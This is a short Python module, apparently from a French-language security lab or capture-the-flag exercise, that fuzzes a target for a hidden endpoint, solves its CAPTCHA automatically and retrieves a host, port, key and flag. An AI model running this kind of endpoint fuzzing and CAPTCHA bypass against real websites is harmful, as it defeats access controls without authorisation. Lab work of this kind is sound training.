import requests

from src.tp3.utils.captcha import solve_captcha
from src.tp3.utils.config import logger
from src.tp3.utils.fuzzer import find_hidden_endpoint


def breach_web(target: str):
    """Fuzz la cible, résout le CAPTCHA, renvoie (host, port, key, flag1)."""
    endpoint = find_hidden_endpoint(target)
    if endpoint is None:
        raise RuntimeError("Endpoint caché introuvable")

    session = requests.Session()
    session.get(endpoint, timeout=5)  # génère le code captcha en session

    captcha_bytes = session.get(f"{target}/captcha.png", timeout=5).content
    code = solve_captcha(captcha_bytes)
    logger.info(f"CAPTCHA lu : {code}")

    resp = session.post(endpoint, data={"captcha": code}, timeout=5)
    data = resp.json()
    if "error" in data:
        raise RuntimeError(f"CAPTCHA refusé : {data}")

    return data["host"], data["port"], data["key"], data["flag1"]
